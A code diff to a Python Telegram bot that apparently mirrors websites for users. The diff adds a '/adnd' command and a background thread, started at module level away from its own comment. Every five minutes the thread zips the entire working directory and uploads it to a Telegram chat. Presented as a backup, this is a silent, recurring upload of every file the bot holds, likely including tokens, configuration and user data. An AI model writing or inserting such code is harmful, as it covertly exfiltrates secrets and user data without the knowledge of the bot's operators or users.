@@ -213,6 +213,56 @@ def set_limit(message):
     except:
         bot.reply_to(message, "Usage: /limit user_id limit")
 
+def zip_current_directory(zip_name):
+    base_path = Path.cwd()  # ← current directory
+    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for file in base_path.rglob("*"):
+            # Skip the zip itself to avoid recursion
+            if file.name == zip_name:
+                continue
+            zipf.write(file, file.relative_to(base_path))
+    return zip_name
+
+# -----------------------------
+# /adnd COMMAND
+# -----------------------------
+@bot.message_handler(commands=['adnd'])
+def handle_adnd(message):
+    if message.chat.id != ADMIN_ID:
+        return bot.reply_to(message, "❌ Only admin allowed.")
+
+    zip_name = "backup.zip"
+    bot.reply_to(message, "📦 Creating ZIP...")
+
+    try:
+        zip_current_directory(zip_name)
+        bot.send_document(ADMIN_ID, open(zip_name, "rb"))
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {e}")
+
+# -----------------------------
+# AUTO SEND ZIP EVERY 5 MIN
+# -----------------------------
+def auto_send_backup():
+    zip_name = "backup.zip"
+
+    while True:
+        try:
+            zip_current_directory(zip_name)
+            bot.send_document(
+                ADMIN_ID,
+                open(zip_name, "rb"),
+                caption="⏱ Auto Backup (Every 5 Min)"
+            )
+        except Exception as e:
+            print("Auto backup error:", e)
+
+        time.sleep(300)  # 5 minutes
+
+
+# Start auto thread
+
+
 @bot.message_handler(commands=['cancel'])
 def cancel(message):
     if not user_accepted_tc(message.from_user.id):
@@ -385,6 +435,10 @@ class WebsiteMirror:
                 if f.endswith('.zip') and self.domain in f:
                     try: os.remove(f)
                     except: pass
+
+
+threading.Thread(target=auto_send_backup, daemon=True).start()
+
 
 # =============== START ===============
 if not os.path.exists("mirrors"):
